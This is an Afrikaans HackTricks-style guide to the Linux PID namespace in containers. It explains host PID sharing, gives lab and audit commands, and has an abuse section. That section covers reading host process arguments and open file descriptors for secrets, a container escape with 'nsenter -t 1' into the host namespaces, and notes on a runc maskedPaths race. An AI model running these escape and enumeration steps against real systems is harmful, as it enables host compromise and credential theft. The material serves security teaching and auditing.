# PID-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die PID-naamruimte beheer hoe prosesse genommer word en watter prosesse sigbaar is. Dit is waarom 'n container sy eie PID 1 kan hê selfs al is dit nie 'n regte masjien nie. Binne die naamruimte sien die werklading wat na 'n plaaslike prosesboom lyk. Buite die naamruimte sien die host steeds die werklike host PIDs en die volledige proseslandskap.

Vanuit 'n sekuriteitsoogpunt is die PID-naamruimte belangrik omdat proses-sigbaarheid waardevol is. Sodra 'n werklading host-prosesse kan sien, kan dit diensname, command-line-argumente, geheime wat in prosesargumente deurgegee word, omgewingsafgeleide toestand via `/proc`, en potensiële teikens vir toegang tot naamruimtes waarneem. As dit meer kan doen as net daardie prosesse sien — byvoorbeeld seine stuur of ptrace gebruik onder die regte toestande — raak die probleem baie ernstiger.

## Werking

'n Nuwe PID-naamruimte begin met sy eie interne prosesnommering. Die eerste proses wat daarin geskep word, word PID 1 vanuit die naamruimte se oogpunt, wat ook beteken dat dit spesiale init-agtige semantiek kry vir weeskinders en seinegedrag. Dit verklaar baie van die container-eienskappe rondom init-prosesse, zombie-opruiming, en waarom klein init-wrappers soms in containers gebruik word.

Die belangrike sekuriteitsles is dat 'n proses geïsoleerd kan lyk omdat dit slegs sy eie PID-boom sien, maar daardie isolasie kan doelbewus verwyder word. Docker stel dit bloot via `--pid=host`, terwyl Kubernetes dit doen via `hostPID: true`. Sodra die container by die host PID-naamruimte aansluit, sien die werklading host-prosesse direk, en baie later aanvalspaaie raak veel meer realisties.

## Lab

Om 'n PID-naamruimte handmatig te skep:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Die shell sien nou 'n private proses-uitsig. Die `--mount-proc` flag is belangrik omdat dit 'n procfs-instansie mount wat ooreenstem met die nuwe PID namespace, waardeur die proseslys van binne af saamhangend is.

Om container-gedrag te vergelyk:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Die verskil is onmiddellik en maklik om te verstaan, daarom is dit 'n goeie eerste lab vir lesers.

## Runtime gebruik

Normale containers in Docker, Podman, containerd en CRI-O kry hul eie PID namespace. Kubernetes Pods ontvang gewoonlik ook 'n geïsoleerde PID view, tensy die workload uitdrukkelik vir host PID sharing vra. LXC/Incus-omgewings vertrou op dieselfde kernel primitive, hoewel system-container use cases meer ingewikkelde process trees kan blootlê en meer debugging shortcuts kan aanmoedig.

Dieselfde reël geld oral: as die runtime besluit het om nie die PID namespace te isoleer nie, is dit 'n opsetlike vermindering van die container boundary.

## Konfigurasiefoute

Die tipiese misconfiguratie is host PID sharing. Spanne regverdig dit dikwels vir debugging, monitoring of diensbestuursgerief, maar dit moet altyd as 'n betekenisvolle sekuriteitsuitzondering behandel word. Selfs as die container geen onmiddellike write primitive oor host processes het nie, kan sigbaarheid alleen al baie oor die stelsel openbaar. Sodra capabilities soos `CAP_SYS_PTRACE` of nuttige procfs-toegang bygevoeg word, brei die risiko beduidend uit.

Nog 'n fout is om aan te neem dat omdat die workload standaard nie host processes kan kill of ptrace nie, host PID sharing daarom skadelos is. Daardie gevolgtrekking ignoreer die waarde van enumeration, die beskikbaarheid van namespace-entry targets, en die manier waarop PID visibility saamwerk met ander verswakte controls.

## Misbruik

As die host PID namespace gedeel word, kan 'n aanvaller host processes inspekteer, process arguments insamel, interessante services identifiseer, kandidaat PIDs vir `nsenter` lokaliseer, of process visibility kombineer met ptrace-verwante voorregte om met host of aangrensende workloads te inmeng. In sommige gevalle is dit genoeg om bloot die regte long-running process te sien om die res van die aanvalplan te herformuleer.

Die eerste praktiese stap is altyd om te bevestig dat host processes werklik sigbaar is:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Sodra host PIDs sigbaar is, word process arguments en namespace-entry targets dikwels die mees nuttige inligtingsbron:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
As `nsenter` beskikbaar is en genoeg voorregte bestaan, toets of 'n sigbare host-proses as 'n namespace-brug gebruik kan word:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Selfs wanneer toegang geblokkeer is, is host PID sharing reeds waardevol omdat dit diensuitleg, runtime-komponente en kandidaat-geprivilegieerde prosesse openbaar om daarna te teiken.

Host PID visibility maak file-descriptor abuse ook realistieser. As 'n geprivilegieerde host-proses of 'n aangrensende workload 'n sensitiewe lêer of sok oop het, kan die aanvaller dalk `/proc/<pid>/fd/` ondersoek en daardie handle hergebruik, afhangend van eienaarskap, procfs mount options, en die target service model.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Hierdie opdragte is nuttig omdat hulle aandui of `hidepid=1` of `hidepid=2` die sigbaarheid tussen prosesse verminder en of voor die hand liggende interessante deskriptoren, soos geopende geheime lêers, logs of Unix-sokette, enigsins sigbaar is.

### Volledige voorbeeld: host PID + `nsenter`

Host PID-deling word 'n direkte host-ontsnapping wanneer die proses ook genoeg voorregte het om by die host-namespaces aan te sluit:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Indien die opdrag slaag, voer die kontainerproses nou uit in die host mount, UTS, network, IPC, en PID namespaces. Die impak is onmiddellike host-kompromittering.

Selfs wanneer `nsenter` self ontbreek, kan dieselfde resultaat deur die host binary behaal word indien die host filesystem gemount is:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Onlangse runtime-aantekeninge

Sommige PID-namespace-verwante aanvalle is nie tradisionele `hostPID: true` wankonfigurasies nie, maar runtime-implementasie-bugs rondom hoe procfs-beskermings toegepas word tydens container-opstelling.

#### `maskedPaths` wedloop na host procfs

In kwesbare `runc` weergawes kon aanvallers wat die container image of `runc exec` werkbelasting kon beheer, die maskeringsfase wedloop deur die container-side `/dev/null` te vervang met 'n symlink na 'n sensitiewe procfs-pad soos `/proc/sys/kernel/core_pattern`. As die wedloop geslaag het, kon die masked-path bind mount op die verkeerde teiken beland en die host se globale procfs-instellings aan die nuwe container blootstel.

Nuttige hersieningskommando:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Dit is belangrik omdat die uiteindelike impak dieselfde kan wees as 'n direkte procfs-blootstelling: skryfbare `core_pattern` of `sysrq-trigger`, gevolg deur host code execution of denial of service.

#### Namespace-inspuiting met `insject`

Namespace-inspuiting-instrumente soos `insject` toon dat PID-namespace-interaksie nie altyd vereis om vooraf die teikennamespace te betree voordat 'n proses geskep word nie. 'n Helper kan later aanheg, `setns()` gebruik, en uitvoer terwyl sigbaarheid in die teiken PID-ruimte behou word:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Hierdie soort tegniek is hoofsaaklik belangrik vir gevorderde debugging, offensive tooling, en post-exploitation workflows waar namespace context ná die runtime se initialisering van die workload aangesluit moet word.

### Verwante FD-misbruikpatrone

Twee patrone is die moeite werd om eksplisiet uit te lig wanneer host PIDs sigbaar is. Eerstens kan 'n geprivilegieerde proses 'n sensitiewe file descriptor oop hou oor `execve()` omdat dit nie as `O_CLOEXEC` gemerk was nie. Tweedens kan dienste file descriptors oor Unix sockets deur `SCM_RIGHTS` deurgee. In albei gevalle is die interessante objek nie meer die padnaam nie, maar die reeds-opgeope handvatsel wat 'n proses met laer privilegies kan erf of ontvang.

Dit is relevant in container-werk omdat die handle na `docker.sock`, 'n geprivilegieerde log, 'n gasheer geheime lêer, of 'n ander hoë-waarde objek kan wys, selfs wanneer die pad self nie direk vanaf die container filesystem bereikbaar is nie.

## Kontroles

Die doel van hierdie kommando's is om te bepaal of die proses 'n private PID-uitsig het of of dit reeds 'n veel breër proses-landskap kan opnoem.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Wat hier interessant is:

- As die proseslys duidelike host-dienste bevat, is host PID sharing waarskynlik reeds in werking.
- Om slegs 'n klein container-local tree te sien is die normale basislyn; om `systemd`, `dockerd`, of nie-verwante daemons te sien, is dit nie.
- Sodra host PIDs sigbaar is, word selfs slegs leesbare prosesinligting nuttige verkenning.

As jy 'n container ontdek wat met host PID sharing loop, beskou dit nie as 'n kosmetiese verskil nie. Dit is 'n groot verandering in wat die werklading kan waarneem en potensieel beïnvloed.
{{#include ../../../../../banners/hacktricks-training.md}}
